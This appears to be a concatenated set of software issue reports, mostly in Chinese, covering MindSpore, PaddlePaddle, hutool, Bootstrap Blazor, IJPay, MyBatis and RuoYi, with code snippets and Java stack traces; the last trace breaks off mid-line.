fetch(w1)--&gt;opA-&gt;fetch(w2)-&gt;opB-&gt;opB(backward)-&gt;w2'-&gt;send(w2')-&gt;opB(backward)-&gt;w1'-&gt;send(w1')-&gt;send_barrier() send_varrier() fetch(w1)--&gt;opA-&gt;fetch(w2)-&gt;opB-&gt;opB(backward)-&gt;w2'-&gt;send(w2')-&gt;opB(backward)-&gt;w1'-&gt;send(w1') AsyncSendOp SendBarrierOp distribute transpiler"
【众智】【计算-GPU开发】Geqrf,"这是一个直接调用LAPACK的底层函数，进行QR分解。 Python层接口 接口目录：mindspore/ops/operations/math_ops.py x y tau 对应底层算子 Classify Name Type Type Range Required Doc Default INPUT x float16,float32,float64 TRUE OUTPUT y float16,float32,float64 TRUE OUTPUT tau float16,float32,float64 TRUE Pytorch接口torch.geqrf： https://pytorch.org/docs/stable/generated/torch.geqrf.html 3. 异常处理 4. 算子反向 无需实现反向。   <code>: class Geqrf(Primitive):"
json输出为字符串 的时候，希望支持null转“”,"JDK版本： openjdk_8_201 hutool版本： 5.8.8 期望 输出为字符串的时候，希望所有的null转为""""。 { ""key1"":""value1"", ""key2"": """" }   <code>: jsonObject内容： { ""key1"":""value1"", ""key2"": null } jsonObject.toJSONString(3）"
Mindspore加载图片报错,": -- Python version : -- OS platform and distribution (e.g., Linux Ubuntu 18.04): 加载这张图片会导致程序出错 博客中也介绍了类似这种错误，在mindspore之前的版本中出现错误并没有提示哪张图片，目前使用1.2.0rc1的时候发现mindspore已经会报错加载出问题的图片   <code>: GPU，不过之前在依瞳的Ascend910中也遇到过这样的问题，之前已经提出过issue不过这个问题时好时坏，目前已经确定是数据的问题，加载的时候会解码报错"
Add CAPI build script.,"We need a CAPI build script to build CAPI.Previously I put it into docker, and I found that when I modify it I should push docker to everytime, so I move it to   <code>: dockerhub paddle/paddle/capi/"
"表格EditMode=""EditMode.InCell""，多选框无法选择。","步骤1：使用模板Bootstrap Blazor Project(Server-Side,Wasm)创建项目 步骤2：编辑TableDemo.razor,设置EditMode=""EditMode.InCell""，其他不做任何修改。 步骤4：运行项目 步骤5：选择Table栏目，编辑其中一条数据 vs 2019 浏览器 edge Server Side   <code>: @page ""/table"" &lt;h1&gt;Table&lt;/h1&gt; &lt;Table TItem=""Foo"" IsPagination=""true"" PageItemsSource=""@PageItemsSource"" IsStriped=""true"" IsBordered=""true"" ShowSkeleton=""true"" IsMultipleSelect=""true"" ShowToolbar=""true"" ShowSearch=""true"" ShowExtendButtons=""true"" UseInjectDataService=""true"" AutoGenerateColumns=""true"" EditMode=""EditMode.InCell""&gt; &lt;TableColumns&gt; &lt;TableColumn @bind-Field=""@context.Hobby"" Items=""@Hobbys"" /&gt; &lt;/TableColumns&gt; &lt;/Table&gt;"
Paddle 2.0如何使用paddle.static搭建静态图的双向GRU层,"PaddlePaddle 2.1.2 我想在非fluid接口实现下面这个双向GRU层，不考虑使用动态图。下面给出了fluid的实现方式和动态图的实现方式。不知如何使用paddle.static实现。我的目的就是在静态图中抛弃Fluid接口。 这个是fluid的实现方式： 这个是动态图的实现方式：   <code>: def bidirectional_gru_bn_layer(input, size, act): """"""双向gru层与顺序批处理归一化，批处理规范化只在输入状态权值上执行。 :param input: Input layer. :type input: Variable :param h_size: GRU的cell的大小 :type h_size: int :param act: 激活函数类型 :type act: string :return: 双向GRU层 :rtype: Variable """""" input_proj_forward = nn.fc(x=input, size=size * 3, weight_attr=paddle.ParamAttr()) input_proj_reverse = nn.fc(x=input, size=size * 3, weight_attr=paddle.ParamAttr()) # 批标准只在与输入相关的预测上执行 input_proj_bn_forward = nn.batch_norm(input=input_proj_forward, act=None, param_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) input_proj_bn_reverse = nn.batch_norm(input=input_proj_reverse, act=None, param_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) # forward and backward in time forward_gru = fluid.layers.dynamic_gru(input=input_proj_bn_forward, size=size, gate_activation='sigmoid', candidate_activation=act, param_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), is_reverse=False) reverse_gru = fluid.layers.dynamic_gru(input=input_proj_bn_reverse, size=size, gate_activation='sigmoid', candidate_activation=act, param_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), is_reverse=True) return paddle.concat(x=[forward_gru, reverse_gru], axis=1) class BiGRUWithBN(nn.Layer): """"""具有顺序批标准化的双向gru层。批标准化只对输入状态权值执行。 :param i_size: GRUCell的输入大小 :type i_size: int :param h_size: GRUCell的隐藏大小 :type h_size: string :return: 双向GRU层 :rtype: nn.Layer """""" def __init__(self, i_size: int, h_size: int): super().__init__() hidden_size = h_size * 3 self.fw_fc = nn.Linear(i_size, hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) self.fw_bn = nn.BatchNorm1D(hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NLC') self.bw_fc = nn.Linear(i_size, hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr()) self.bw_bn = nn.BatchNorm1D(hidden_size, weight_attr=paddle.ParamAttr(), bias_attr=paddle.ParamAttr(), data_format='NLC') self.fw_cell = nn.GRUCell(input_size=hidden_size, hidden_size=h_size, weight_ih_attr=paddle.ParamAttr(), weight_hh_attr=paddle.ParamAttr(), bias_ih_attr=paddle.ParamAttr(), bias_hh_attr=paddle.ParamAttr()) self.bw_cell = nn.GRUCell(input_size=hidden_size, hidden_size=h_size, weight_ih_attr=paddle.ParamAttr(), weight_hh_attr=paddle.ParamAttr(), bias_ih_attr=paddle.ParamAttr(), bias_hh_attr=paddle.ParamAttr()) self.fw_rnn = nn.RNN(self.fw_cell, is_reverse=False, time_major=False) # [B, T, D] self.bw_rnn = nn.RNN(self.bw_cell, is_reverse=True, time_major=False) # [B, T, D] def forward(self, x, x_len): # x, shape [B, T, D] fw_x = self.fw_bn(self.fw_fc(x)) bw_x = self.bw_bn(self.bw_fc(x)) fw_x, _ = self.fw_rnn(inputs=fw_x, sequence_length=x_len) bw_x, _ = self.bw_rnn(inputs=bw_x, sequence_length=x_len) x = paddle.concat([fw_x, bw_x], axis=-1) return x"
[CT][MS][Log2]test report AssertionError when input x is 0d,"log2 输入x是scalar tensor时，输出结果与标杆对比失败， 输出shape不一致 / 硬件环境: /device ascend/GPU/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 用例执行成功， 对标没问题   <code>: def test_f_log2_0d_float32(): input_x = Tensor(np.random.uniform(low=2, high=100), mstype.float32) fact = Log2Mock(inputs=[input_x]) fact.forward_cmp() fact.grad_cmp() def test_f_log2_0d_float32(): input_x = Tensor(np.random.uniform(low=2, high=100), mstype.float32) fact = Log2Mock(inputs=[input_x]) &gt; fact.forward_cmp() ../share/ops/primitive/log2_f_ops.py:73: in forward_cmp allclose_nparray(out_torch, out_mindspore, self.loss, self.loss) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(5.7427793, dtype=float32), data_me = array([5.7427793], dtype=float32), rtol = 0.0001, atol = 0.0001, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) elif not np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan): _count_unequal_element(data_expected, data_me, rtol, atol) else: &gt; assert np.array(data_expected).shape == np.array(data_me).shape E AssertionError"
微信支付WxPayKit签名验证方法错误,"IJPay 版本: 2.8.3 开发环境: Idea 支付方式: 微信支付 调用的接口: 支付回调 验签方法，外部传入的SignType被方法内默认的SignType.MD5覆盖，导致HMACSHA256签名验证失败 IJPay 让支付触手可及交流群：723992875、864988890   <code>: WxPayKit.verifyNotify 方法 /** * 支付异步通知时校验 sign * * @param params 参数 * @param partnerKey 支付密钥 * @param signType {@link SignType} * @return {@link Boolean} 验证签名结果 */ public static boolean verifyNotify(Map&lt;String, String&gt; params, String partnerKey, SignType signType) { return verifyNotify(params, partnerKey, SignType.MD5, null); }"
There is no getter for property named 'statement' in 'class org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy'],"用官方Springboot Demo, 改成Gradle以及使用Mysql后访问接口报如下错误，一直没有找到解决办法   <code>: 2017-11-16 14:50:37.651 ERROR 29562 --- [nio-8764-exec-7] o.a.c.c.C.[.[.[/].[dispatcherServlet] : Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: There is no getter for property named 'statement' in 'class org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy'] with root cause org.apache.ibatis.reflection.ReflectionException: There is no getter for property named 'statement' in 'class org.apache.tomcat.jdbc.pool.StatementFacade$StatementProxy' at org.apache.ibatis.reflection.Reflector.getGetInvoker(Reflector.java:419) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaClass.getGetInvoker(MetaClass.java:164) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.wrapper.BeanWrapper.getBeanProperty(BeanWrapper.java:162) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.wrapper.BeanWrapper.get(BeanWrapper.java:49) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:122) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:119) ~[mybatis-3.4.5.jar:3.4.5] at com.baomidou.mybatisplus.plugins.PerformanceInterceptor.intercept(PerformanceInterceptor.java:81) ~[mybatis-plus-2.1.5.jar:na] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy122.query(Unknown Source) ~[na:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_152] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_152] at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:63) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy122.query(Unknown Source) ~[na:na] at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:136) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) ~[mybatis-3.4.5.jar:3.4.5] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_152] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_152] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ~[mybatis-spring-1.3.1.jar:1.3.1] at com.sun.proxy.$Proxy78.selectList(Unknown Source) ~[na:na] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:238) ~[mybatis-spring-1.3.1.jar:1.3.1] at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:135) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:75) ~[mybatis-3.4.5.jar:3.4.5] at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:59) ~[mybatis-3.4.5.jar:3.4.5] at com.sun.proxy.$Proxy83.selectPage(Unknown Source) ~[na:na] at com.baomidou.mybatisplus.service.impl.ServiceImpl.selectPage(ServiceImpl.java:419) ~[mybatis-plus-2.1.5.jar:na] at com.baomidou.mybatisplus.service.impl.ServiceImpl.selectPage(ServiceImpl.java:396) ~[mybatis-plus-2.1.5.jar:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_152] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_152] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_152] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_152] at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:333) ~[spring-aop-4.3.12.RELEASE.jar:4.3.12.RELEASE] at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207) ~[spring-aop-4.3.12.RELEASE.jar:4.3.12.RELEASE] ```console"
新建子模块报错,依赖   <code>: &lt;parent&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-modules&lt;/artifactId&gt; &lt;version&gt;2.5.0&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;ruoyi-test&lt;/artifactId&gt; &lt;description&gt; test模块 &lt;/description&gt; &lt;dependencies&gt; &lt;!-- SpringCloud Ailibaba Nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- SpringCloud Ailibaba Nacos Config --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- SpringCloud Ailibaba Sentinel --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- SpringBoot Actuator --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Swagger UI --&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;${swagger.fox.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!-- Mysql Connector --&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RuoYi Common DataSource --&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-common-datasource&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RuoYi Common DataScope --&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-common-datascope&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RuoYi Common Log --&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-common-log&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- RuoYi Common Swagger --&gt; &lt;dependency&gt; &lt;groupId&gt;com.ruoyi&lt;/groupId&gt; &lt;artifactId&gt;ruoyi-common-swagger&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;finalName&gt;${project.artifactId}&lt;/finalName&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${spring-boot.version}&lt;/version&gt; &lt;configuration&gt; &lt;outputDirectory&gt;${build.path}&lt;/outputDirectory&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'documentationPluginsBootstrapper' defined in URL [jar:file:/Users/mac/java/Maven_Repository/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/DocumentationPluginsBootstrapper.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'webMvcRequestHandlerProvider' defined in URL [jar:file:/Users/mac/java/Maven_Repository/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/WebMvcRequestHandlerProvider.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'webEndpointServletHandlerMapping' defined in class path resource [org/springframework/boot/actuate/autoconfigure/endpoint/web/servlet/WebMvcEndpointManagementContextConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping]: Factory method 'webEndpointServletHandlerMapping' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'healthEndpoint' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Unsatisfied dependency expressed through method 'healthEndpoint' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1356) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1203) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:897) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:879) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:551) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:143) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:758) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:750) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:405) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1237) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at com.ruoyi.user.BzApplication.main(BzApplication.java:17) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'webMvcRequestHandlerProvider' defined in URL [jar:file:/Users/mac/java/Maven_Repository/io/springfox/springfox-spring-web/2.9.2/springfox-spring-web-2.9.2.jar!/springfox/documentation/spring/web/plugins/WebMvcRequestHandlerProvider.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'webEndpointServletHandlerMapping' defined in class path resource [org/springframework/boot/actuate/autoconfigure/endpoint/web/servlet/WebMvcEndpointManagementContextConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping]: Factory method 'webEndpointServletHandlerMapping' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'healthEndpoint' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Unsatisfied dependency expressed through method 'healthEndpoint' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:799) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1356) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1203) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1525) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1489) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveMultipleBeans(DefaultListableBeanFactory.java:1378) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1265) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:886) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:790) ... 20 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'webEndpointServletHandlerMapping' defined in class path resource [org/springframework/boot/actuate/autoconfigure/endpoint/web/servlet/WebMvcEndpointManagementContextConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping]: Factory method 'webEndpointServletHandlerMapping' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'healthEndpoint' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Unsatisfied dependency expressed through method 'healthEndpoint' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource [com/baomidou/dynamic/datasource/spring/boot/autoconfigure/DynamicDataSourceAutoConfiguration.class]: Invocation of init method failed; nested exception is java.lang.RuntimeException: dynamic-datasource Please check the setting of primary at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:657) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:637) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.addCandidateEntry(DefaultListableBeanFactory.java:1525) at org.springframework.beans.factory.support.DefaultListableBeanFactory.findAutowireCandidates(DefaultListableBeanFactory.java:1489) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveMultipleBeans(DefaultListableBeanFactory.java:1378) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1265) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:886) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:790) ... 37 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping]: Factory method 'webEndpointServletHandlerMapping' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'healthEndpoint' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Unsatisfied dependency expressed through method 'healthEndpoint' parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'healthContributorRegistry' defined in class path resource [org/springframework/boot/actuate/autoconfigure/health/HealthEndpointConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.actuate.health.HealthContributorRegistry]: Factory method 'healthContributorRegistry' threw exception; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'org.springframework.boot.actuate.autoconfigure.jdbc.DataSourceHealthContributorAutoConfiguration': Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dataSource' defined in class path resource 